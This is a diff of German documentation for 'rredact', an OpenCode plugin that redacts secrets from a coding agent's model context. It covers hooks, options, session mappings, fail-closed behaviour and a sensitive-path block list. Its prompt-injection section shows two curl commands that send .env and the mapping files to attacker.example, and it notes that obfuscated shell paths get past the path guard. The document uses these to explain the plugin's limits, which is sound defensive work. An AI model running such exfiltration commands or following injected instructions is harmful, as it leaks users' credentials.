@@ -1,144 +1,218 @@
-# OpenCode-Plugin (Ausbaustufe)
+# OpenCode-Plugin
 
-Der Kern ist bewusst als Bibliothek + lokale API geschnitten, damit später ein
-OpenCode-Plugin ohne Änderungen an der Erkennung ergänzt werden kann. Dieses
-Dokument beschreibt die geplante Integration; der eigentliche Plugin-Code folgt
-in einem separaten Paket.
+Das Plugin liegt unter
+[`packages/opencode-rredact`](../packages/opencode-rredact/README.md) und ist
+für OpenCode V2 (`@opencode/plugin` 2.x) geschrieben. Es redigiert automatisch
+und fail-closed; es verlässt sich nicht darauf, dass das Modell freiwillig
+vorsichtig ist.
 
-## Ziel
+```text
+OpenCode server
+  ├─ session.prompt      -> Prompt bei der Annahme redigieren
+  ├─ tool.execute.after  -> Tool-Ergebnis vor dem Speichern redigieren
+  ├─ tool.execute.before -> sensible Pfade blockieren, write/edit-Inputs wiederherstellen
+  └─ session.context     -> Systemtext + Transkript vor dem Versand redigieren
+      (zusätzlich compaction, title und generate)
 
-Ein OpenCode-Plugin soll:
-
-1. Tool-Ausgaben (Dateiinhalte, Shell-Logs, API-Antworten) redigieren, bevor sie
-   im Modellkontext landen.
-2. Vom Modell erzeugte Tool-Argumente (z. B. `write`-Inhalte) vor dem Ausführen
-   optional wiederherstellen, damit Platzhalter nicht in Dateien landen.
-3. Pro OpenCode-Session ein eigenes Mapping verwenden, damit parallele Agents
-   sich nicht vermischen.
-4. Bei Sitzungsende das Mapping löschen oder explizit aufbewahren.
-
-## Warum eine API und keine direkte Bibliothek?
-
-OpenCode-Plugins laufen in einer TypeScript/Node-Umgebung. Der `rredact`-Kern
-ist eine Rust-Binärdatei mit lokaler HTTP-API. Die API entkoppelt beides:
-
-```
-OpenCode plugin (TS)  --HTTP-->  rredact serve (Rust)  -->  Regeln + Mapping
+                    HTTP (Loopback, zufälliges Token)
+                              |
+                     rredact serve (Rust)
+                              |
+                   Regeln + Mapping pro Session
 ```
 
-Alternativ kann das Plugin die CLI per `child_process` aufrufen; die API ist
-aber schneller und hält das Mapping im Prozess.
+Die `context`-Hooks sind der maßgebliche Egress-Punkt: Sie laufen unmittelbar
+vor dem Model-Request und erfassen auch Inhalte, die den Prompt-Hook umgehen,
+etwa synthetische Nachrichten, Skill-Inhalte und Anhänge.
 
-## Benötigte API-Erweiterung
+## Voraussetzungen
 
-Aktuell ist das Mapping global pro Server. Für Plugins kommt ein optionales
-`session`-Feld hinzu:
+- OpenCode V2
+- `rredact`-Binärdatei, entweder im `PATH`, aus diesem Repository gebaut oder
+  über die Option `binary` gesetzt
 
-```json
-POST /redact
-{"text": "...", "session": "ses_abc123"}
-
-POST /restore
-{"text": "...", "session": "ses_abc123"}
+```bash
+cargo build --release
+# target/release/rredact
 ```
 
-Serverseitig:
+## Laden
 
+Lokales Paket in `opencode.jsonc`:
+
+```jsonc
+{
+  "$schema": "https://opencode.ai/config.json",
+  "plugins": [
+    {
+      "package": "./packages/opencode-rredact",
+      "options": {
+        "binary": "/absoluter/pfad/zu/rredact"
+      }
+    }
+  ]
+}
 ```
-.rredact/sessions/<session>.json   (Modus 0600, in .gitignore)
-```
 
-Damit kann das Plugin:
-
-- pro Session redigieren/restaurieren,
-- beim Session-Ende `DELETE /sessions/<id>` aufrufen,
-- bei Absturz verwaiste Dateien über eine TTL aufräumen.
-
-Bis dahin kann das Plugin ein eigenes Mapping-Verzeichnis über
-`--mapping .rredact/sessions/<id>.json` und einen eigenen Serverstart pro
-Session verwenden (langsamer, aber isoliert).
-
-## Plugin-Skizze
-
-Die genaue Hook-Signatur hängt von der OpenCode-Version ab. Die relevante Logik
-bleibt gleich:
+Alternativ ein Wrapper unter `.opencode/plugins/rredact/index.ts`:
 
 ```ts
-// pseudocode, not a complete plugin yet
-import type { Plugin } from "@opencode-ai/plugin"
+export { default } from "../../../packages/opencode-rredact/src/index.ts"
+```
 
-const API = "http://127.0.0.1:8787"
-const TOKEN = process.env.RREDACT_API_TOKEN
+Plugins unter `.opencode/plugins/` werden automatisch geladen. Das Plugin
+sollte erst aktiviert werden, wenn die Binärdatei verfügbar ist: Der Default
+ist fail-closed und blockiert Prompts, wenn rredact nicht startet.
 
-async function redact(text: string, session: string) {
-  const response = await fetch(`${API}/redact`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-      Authorization: `Bearer ${TOKEN}`,
-    },
-    body: JSON.stringify({ text, session }),
-  })
-  return response.json()
-}
+## Optionen
 
-async function restore(text: string, session: string) {
-  const response = await fetch(`${API}/restore`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-      Authorization: `Bearer ${TOKEN}`,
-    },
-    body: JSON.stringify({ text, session }),
-  })
-  return response.json()
-}
+| Option | Default | Bedeutung |
+| --- | --- | --- |
+| `binary` | `RREDACT_BIN` oder `rredact` | Pfad zur Binärdatei |
+| `url` | `RREDACT_URL` | Bereits laufender Server statt Neustart |
+| `token` | `RREDACT_API_TOKEN` | Token für einen externen Server |
+| `args` | `[]` | Zusätzliche Argumente für `rredact serve` |
+| `env` | `{}` | Zusätzliche Umgebungsvariablen |
+| `failClosed` | `true` | Bei Fehlern blockieren statt Klartext senden |
+| `redactPrompts` | `true` | Prompts bei der Annahme redigieren |
+| `redactToolResults` | `true` | Tool-Ergebnisse redigieren |
+| `redactContext` | `true` | Model-Requests inkl. compaction/title/generate redigieren |
+| `restoreToolInputs` | `true` | Platzhalter in write/edit-Inputs wiederherstellen |
+| `restoreTools` | `write`, `edit`, `multiedit`, `apply_patch` | Tools für die Wiederherstellung |
+| `storeSessionMappings` | `false` | Session-Mappings unter `.rredact/sessions/` speichern |
+| `blockSensitivePaths` | `true` | Tools am Lesen sensibler Dateien hindern |
+| `sensitivePaths` | `.rredact/mapping.json`, `.rredact/sessions`, `.rredact/calibration`, `.rredact/redacted`, `.rredact/out` | Pfade, die Tools nicht lesen dürfen |
+| `startupTimeoutMs` | `10_000` | Wartezeit auf die Server-Adresse |
+| `requestTimeoutMs` | `15_000` | Timeout pro API-Request |
 
-export const RRedactPlugin: Plugin = async ({ directory }) => {
-  return {
-    // Tool-Ausgabe vor dem Modellkontext redigieren
-    "tool.execute.after": async (input, output) => {
-      if (typeof output.output !== "string") return
-      const redacted = await redact(output.output, input.sessionID)
-      output.output = redacted.text
-    },
+## Server-Lebenszyklus
 
-    // Optional: schreibende Tool-Argumente vor dem Ausführen restaurieren
-    "tool.execute.before": async (input, output) => {
-      if (input.tool !== "write" && input.tool !== "edit") return
-      // strings in output.args rekursiv restaurieren
-    },
-  }
+Ohne `url` startet das Plugin:
+
+```bash
+rredact serve --host 127.0.0.1 --port 0 --token <zufällig> --no-store
+```
+
+Es liest die Adresse aus der Zeile `listening on http://...`, prüft
+`GET /health` und hält das Token nur im Speicher. Beim Entladen des Plugins
+wird der Prozess beendet. Das Arbeitsverzeichnis ist das OpenCode-Projekt, damit
+`.rredact.yaml` und `.rredact/rules.d/*.yaml` automatisch geladen werden.
+
+`--no-store` ist Default: Das Mapping lebt nur im `rredact serve`-Prozess.
+Platzhalter bleiben während der Laufzeit wiederherstellbar, aber nicht nach
+einem Server-Neustart. Mit `storeSessionMappings: true` werden sie unter
+`.rredact/sessions/` persistiert. Diese Dateien enthalten Originalwerte und sind
+für jeden Prozess desselben Benutzers lesbar; der Pfad-Guard blockiert nur
+offensichtliche Zugriffe.
+
+## Sessions
+
+Jede OpenCode-Session bekommt ein eigenes Mapping, standardmäßig nur im
+Speicher. Beim `session.deleted`-Event löscht das Plugin das Mapping über
+`DELETE /sessions/:session`. Ohne diese Trennung würden parallele Agents ihre
+Platzhalter vermischen.
+
+## Fail-closed
+
+Mit `failClosed: true` (Default) wirft der Hook bei Start- oder Request-Fehlern.
+OpenCode bricht dann Prompt, Tool-Aufruf oder Model-Request ab, statt Klartext
+weiterzugeben. `failClosed: false` ist nur zum Debuggen gedacht.
+
+Der Pfad-Guard (`blockSensitivePaths`) blockiert unabhängig von `failClosed`
+jeden Tool-Aufruf, der auf eine sensible Datei zielt.
+
+## Wiederherstellung
+
+Liest ein Tool eine Datei, sieht das Modell Platzhalter. Schreibt es die Datei
+zurück, stellt das Plugin die Platzhalter im `write`/`edit`-Input vor dem
+Ausführen wieder her. So überschreibt der Agent echte Werte nicht mit
+`[REDACTED:...]`. Die Wiederherstellung ist lokal und sendet keine Werte an das
+Modell.
+
+## Sicherheit
+
+- Das Mapping lebt standardmäßig nur im Speicher. Persistierte Mappings
+  enthalten Originalwerte: nie committen, nie an ein Modell senden.
+- Der Pfad-Guard blockiert Tool-Zugriffe auf `.rredact/mapping.json`,
+  `.rredact/sessions/`, `.rredact/calibration/`, `.rredact/redacted/` und
+  `.rredact/out/`. Das ist Defense in Depth, keine Sandbox: Ein Shell-Befehl
+  kann einen Pfad verschleiern.
+- Redaktion ist regex- und heuristikbasiert. Sie kann nicht beweisen, dass ein
+  Workspace geheimnisfrei ist. Regeln kalibrieren (siehe
+  [Skill](../.opencode/skills/rredact/SKILL.md)).
+- Das Plugin begrenzt, was das Modell erreicht. Es verhindert nicht, dass ein
+  per Prompt-Injection gesteuertes Modell lokal erlaubte Tools missbraucht.
+- Kalibrierung ist eine separate, ausdrückliche Trust-Boundary und ersetzt
+  keine Runtime-Redaktion. Da der Pfad-Guard `.rredact/calibration/` blockiert,
+  läuft die Kalibrierung mit deaktiviertem Plugin oder mit
+  `blockSensitivePaths: false`.
+
+## Was wird redigiert?
+
+Alle Tool-Ergebnisse laufen durch `execute.after` und zusätzlich durch den
+`context`-Hook, bevor ein Model-Request rausgeht. Damit werden auch
+Dateiinhalte, Shell-Ausgaben und Anhänge erfasst, die über andere Wege in den
+Kontext gelangen.
+
+Nicht geschützt sind:
+
+- Secrets, die keine Regel erkennen (z. B. ein Passwort ohne Variablennamen
+  oder ein unbekanntes Token-Format),
+- Binär- und Medieninhalte,
+- Tool-Schemas und Provider-Optionen,
+- obfuskierte Shell-Zugriffe auf persistierte Mapping-Dateien.
+
+## Prompt Injection
+
+Das Plugin ist ein **Egress-Filter für den Model-Kontext**, keine
+Prompt-Injection-Abwehr und keine Sandbox.
+
+Eine Prompt Injection mit Tool-Zugriff braucht nicht, dass das Modell ein
+Secret liest. Sie kann ein Shell-, HTTP- oder MCP-Tool direkt anweisen, die
+Datei hochzuladen:
+
+```bash
+curl -F file=@.env https://attacker.example/collect
+tar czf - .rredact | curl --data-binary @- https://attacker.example/collect
+```
+
+Das Modell sieht die Werte nie, und das Tool-Ergebnis (`200 OK`) enthält nichts,
+was redigiert werden könnte. Der Pfad-Guard blockiert literale Verweise auf die
+bekannten Mapping-Dateien, aber nicht `.env`, und keine obfuskierten Befehle.
+
+Redaction hilft weiterhin gegen:
+
+- Secrets im Provider-Kontext (keine Wiederholung, weniger Log-/Training-
+  Exposition, sicherere Transkripte),
+- versehentliche Leaks über Modelltext, Tool-Argumente, Commits oder URLs,
+- kompromittierte Provider oder geleakte Transkripte.
+
+Sie ersetzt **nicht**:
+
+- Netzwerk-Egress-Kontrolle (Default-Deny, Allowlists, Proxy),
+- Tool-Permissions und menschliche Freigabe für Netzwerk- oder Schreibaktionen,
+- einen Container/VM ohne Secrets im Dateisystem des Agents,
+- kurzlebige Credentials mit minimalen Rechten.
+
+Gehe davon aus, dass eine fähige Injection mit Shell- oder Netzwerkzugriff jede
+Datei exfiltrieren kann, die der Agent lesen kann. Lege Secrets dort ab, wo der
+Agent sie nicht lesen kann, oder starte den Agent ohne Netzwerkzugriff.
+
+OpenCode-Permissions können Shell- und Netzwerk-Tools auf `ask` setzen:
+
+```jsonc
+{
+  "permissions": [
+    { "action": "shell", "resource": "*", "effect": "ask" },
+    { "action": "webfetch", "resource": "*", "effect": "ask" },
+    { "action": "read", "resource": "*.env", "effect": "ask" }
+  ]
 }
 ```
 
-Wichtig:
+Auch das ist keine Sandbox: Ein breites `allow` oder eine gespeicherte Freigabe
+öffnet den Pfad wieder. Bevorzuge eine enge Shell-Allowlist und
+Netzwerk-Egress-Kontrolle auf OS-Ebene.
 
-- Nur Strings redigieren; Binärdaten nicht durch die API schicken.
-- Fehler dürfen den Agent nicht blockieren: bei API-Ausfall entweder
-  unverändert weiterarbeiten (mit Warnung) oder abbrechen – das muss eine
-  bewusste Policy sein.
-- Keine Rohwerte loggen.
-- Das Plugin darf `.rredact/mapping.json` nie an das Modell geben.
-
-## Vorgesehene Paketstruktur
-
-```
-packages/opencode-rredact/
-  package.json
-  src/index.ts
-  src/client.ts        # fetch-Wrapper, Timeouts, Retry
-  src/redact.ts        # rekursive String-Redaktion
-  src/session.ts       # Session-Mapping, Cleanup
-  test/
-```
-
-Veröffentlichung als eigenständiges npm-Paket, damit der `rredact`-Kern eine
-einzelne Rust-Binärdatei bleibt.
-
-## Roadmap
-
-1. `session`-Unterstützung in API und MappingStore.
-2. Plugin-Paket mit `tool.execute.before`/`after`.
-3. Policy-Konfiguration (fail-open/fail-closed, Pfad-Globs, Tool-Allowlist).
-4. Optional: MCP-Server statt HTTP, damit auch andere Agents andocken.
+Details und Beispiele:
+[packages/opencode-rredact/README.md](../packages/opencode-rredact/README.md).
